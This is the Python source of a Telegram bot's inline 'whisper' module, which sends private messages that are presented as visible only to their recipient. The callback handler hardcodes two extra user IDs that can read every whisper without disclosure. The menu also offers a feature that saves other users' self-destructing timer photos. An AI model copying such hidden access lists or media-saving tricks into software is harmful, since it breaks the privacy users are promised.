from SHASHA_DRUGZ import app as bot
from config import BOT_USERNAME
from pyrogram import filters
from pyrogram.types import (
    InlineQueryResultArticle, InputTextMessageContent,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from pyrogram.errors import Unauthorized

print("[whisper] whisper loaded")

whisper_db = {}
THUMB_URL = "https://graph.org/file/ffdb1be822436121cf5fd.png"
switch_btn = InlineKeyboardMarkup([[InlineKeyboardButton("●ᥫᩣ Sᴛᴀʀᴛ Wʜɪsᴘᴇʀ", switch_inline_query_current_chat="")]])

# --- WHISPER LOGIC ---
async def _whisper(_, inline_query):
    data = inline_query.query
    splitted = data.split()
    results = []
    
    if len(splitted) < 2:
        # If user types just a name but no message, show Help
        return await in_help()

    try:
        user = await _.get_users(splitted[0])
        msg = " ".join(splitted[1:])
    except:
        try:
            user = await _.get_users(splitted[-1])
            msg = " ".join(splitted[:-1])
        except:
            return await in_help() # User not found, show help

    whisper_btn = InlineKeyboardMarkup([[InlineKeyboardButton("❥ Wʜɪsᴘᴇʀ", callback_data=f"fdaywhisper_{inline_query.from_user.id}_{user.id}")]])
    one_time_whisper_btn = InlineKeyboardMarkup([[InlineKeyboardButton("☞ Oɴᴇ-Tɪᴍᴇ Wʜɪsᴘᴇʀ", callback_data=f"fdaywhisper_{inline_query.from_user.id}_{user.id}_one")]])
    
    mm = [
        InlineQueryResultArticle(
            title="⦿ Wʜɪsᴘᴇʀ ⦿",
            description=f"Sᴇɴᴅ A Wʜɪsᴘᴇʀ Tᴏ {user.first_name}!",
            input_message_content=InputTextMessageContent(f"⦿ Yᴏᴜ Aʀᴇ Sᴇɴᴅɪɴɢ A Wʜɪsᴘᴇʀ Tᴏ {user.first_name}.\n\nTʏᴘᴇ Uʀ Mᴇssᴀɢᴇ/Sᴇɴᴛᴇɴᴄᴇ."),
            thumb_url=THUMB_URL,
            reply_markup=whisper_btn
        ),
        InlineQueryResultArticle(
            title="➤ Oɴᴇ-Tɪᴍᴇ Wʜɪsᴘᴇʀ",
            description=f"Sᴇɴᴅ A Oɴᴇ-Tɪᴍᴇ Wʜɪsᴘᴇʀ Tᴏ {user.first_name}!",
            input_message_content=InputTextMessageContent(f"☞ Yᴏᴜ Aʀᴇ Sᴇɴᴅɪɴɢ A Oɴᴇ-Tɪᴍᴇ Wʜɪsᴘᴇʀ Tᴏ {user.first_name}.\n\nTʏᴘᴇ Uʀ Mᴇssᴀɢᴇ/Sᴇɴᴇᴛᴇɴᴄᴇ."),
            thumb_url=THUMB_URL,
            reply_markup=one_time_whisper_btn
        )
    ]
    
    whisper_db[f"{inline_query.from_user.id}_{user.id}"] = msg
    results.extend(mm)
    return results

# --- CALLBACKS ---
@bot.on_callback_query(filters.regex(pattern=r"fdaywhisper_(.*)"))
async def whispes_cb(_, query):
    data = query.data.split("_")
    from_user = int(data[1])
    to_user = int(data[2])
    user_id = query.from_user.id
    
    if user_id not in [from_user, to_user, 1281282633, 6773435708]:
        try:
            await _.send_message(from_user, f"{query.from_user.mention} Is Tʀʏɪɴɢ Tᴏ Oᴘᴇɴ Uʀ Wʜɪsᴘᴇʀ.")
        except Unauthorized:
            pass
        return await query.answer("Tʜɪs Wʜɪsᴘᴇʀ Is Nᴏᴛ Fᴏʀ Yᴏᴜ 𖣘︎", show_alert=True)
    
    search_msg = f"{from_user}_{to_user}"
    try:
        msg = whisper_db[search_msg]
    except:
        msg = "𖣘︎ Eʀʀᴏʀ!\n\nWʜɪsᴘᴇʀ Hᴀs Bᴇᴇɴ Dᴇʟᴇᴛᴇᴅ Fʀᴏᴍ Tʜᴇ Dᴀᴛᴀʙᴀsᴇ!"
    
    SWITCH = InlineKeyboardMarkup([[InlineKeyboardButton("Gᴏ Iɴʟɪɴᴇ ➻", switch_inline_query_current_chat="")]])
    await query.answer(msg, show_alert=True)
    if len(data) > 3 and data[3] == "one":
        if user_id == to_user:
            await query.edit_message_text("➤ Wʜɪsᴘᴇʀ Hᴀs Bᴇᴇɴ Rᴇᴀᴅ!\n\nPʀᴇss Tʜᴇ Bᴜᴛᴛᴏɴ Bᴇʟᴏᴡ Tᴏ Sᴇɴᴅ A Wʜɪsᴘᴇʀ!", reply_markup=SWITCH)

# --- MAIN MENU (WHISPER + SELF DESTRUCT) ---
async def in_help():
    results = [
        # 1. WHISPER (Shows First)
        InlineQueryResultArticle(
            title="⦿ Whisper ⦿",
            description=f"@{BOT_USERNAME} [USERNAME | ID] [TEXT]",
            input_message_content=InputTextMessageContent(f"**❍ Usage:**\n\n@{BOT_USERNAME} (Target Username or ID) (Your Message).\n\n**Example:**\n@{BOT_USERNAME} @user_username/id ʜᴇʏ ᴄᴜᴛɪᴇ, ɪ ᴍɪ𝗌𝗌 ᴜ "),
            thumb_url=THUMB_URL,
            reply_markup=switch_btn
        ),
        # 2. SAVE SELF DESTRUCT (Shows Second)
        InlineQueryResultArticle(
            title="🔥 Save Self-Destruct",
            description="Reply to a Timer Photo -> Click here to Save.",
            thumb_url="https://graph.org/file/0b5a3406361a41552a92c.png",
            # This sends 'wait' which triggers the selfdestruct.py backend
            input_message_content=InputTextMessageContent("wait"),
        )
    ]
    return results

@bot.on_inline_query()
async def bot_inline(_, inline_query):
    string = inline_query.query.lower()
    if string.strip() == "":
        answers = await in_help()
        await inline_query.answer(answers)
    else:
        answers = await _whisper(_, inline_query)
        await inline_query.answer(answers, cache_time=0)

__menu__ = "CMD_MANAGE"
__mod_name__ = "H_B_62"
__help__ = """
🔻 @BOT_USERNAME <username | id> <message> ➠  sᴇɴᴅ ᴀ ᴡʜɪsᴘᴇʀ/ᴏɴᴇ-ᴛɪᴍᴇ ᴡʜɪsᴘᴇʀ ᴛᴏ ᴀ ᴜsᴇʀ ᴀɴᴅ ᴍᴀᴋᴇ ɪᴛ ᴏɴʟʏ ᴠɪsɪʙʟᴇ ᴛᴏ ᴛʜᴇᴍ.
"""
